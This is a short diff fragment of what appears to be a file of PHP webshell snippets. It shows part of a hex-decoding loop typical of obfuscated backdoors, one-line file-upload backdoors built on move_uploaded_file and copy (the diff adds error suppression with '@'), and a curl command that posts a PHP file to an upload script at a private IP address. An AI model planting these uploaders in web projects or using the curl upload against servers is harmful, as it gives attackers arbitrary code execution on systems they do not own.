@@ -166,7 +166,7 @@ for ($i = 0; $i < strlen($c); $i+= 2) $buf.= urldecode("%" . substr($c, $i, 2));
 echo "1";
 ?>
 
-<?php move_uploaded_file($_FILES[f][tmp_name], $_FILES[f][name]);
+<?php @move_uploaded_file($_FILES[f][tmp_name], $_FILES[f][name]);
 curl -F "f=@/tmp/a.php" http://192.168.1.2/up.php
 
 <?php copy($_FILES['file']['tmp_name'], './' . $_FILES['file']['name']);
